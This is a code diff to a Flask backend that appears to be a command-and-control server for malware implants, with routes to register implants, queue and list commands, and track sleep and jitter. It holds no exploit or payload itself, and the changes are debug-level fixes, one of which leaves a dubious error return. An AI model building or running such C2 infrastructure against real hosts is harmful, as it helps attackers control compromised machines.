@@ -110,7 +110,7 @@ def handle_execute():
 # List all commands for a particular implant
 
 
-@app.route("/getCommands/<id>", methods=["GET"])
+@app.route("/getCommands/<id>", methods=["POST"])
 def get_commands(id):
     success = None
     try:
@@ -126,19 +126,24 @@ def get_commands(id):
 @app.route("/register_implant", methods=["POST"])
 def register_implant():
     try:
-        data = request.get_json()
-        first_connection, last_seen = datetime.now().isoformat()
+        print("Registering Implant")
+        data = request.json
+        print(f"Recieved: {data}")
+        print(data['sleep'])
+        jitter = data['jitter']
+        sleep = data['sleep']
+        first_connection = last_seen = datetime.now().isoformat()
         active = True
-        jitter = data.jitter
-        sleep = data.sleep
         columns = ["first_connection", "active", "jitter", "sleep", "last_seen"]
-        data = [first_connection, active, jitter, sleep, last_seen]
-        query = tools.insertQueryBuilder("implants", columns, "implant_id")
-        response = tools.executeInsertQuery(query, data)
+        values = [first_connection, active, jitter, sleep, last_seen]
+        print("Executing Query")
+        query = tools.insertQueryBuilder("implants", columns, ["implant_id"])
+        response = tools.executeInsertQuery(query, values)
+        print(f"Response: {response}")
         return response, 200, {'Access-Control-Allow-Origin': config.clientURL}
     except Exception as e:
         print(f"ERROR: {e}")
-        return f"error {e}", 500, {'Access-Control-Allow-Origin': config.clientURL}
+        return e, {'Access-Control-Allow-Origin': config.clientURL}
 
 #Display implants 
 @app.route("/display_implants", methods=["GET"])
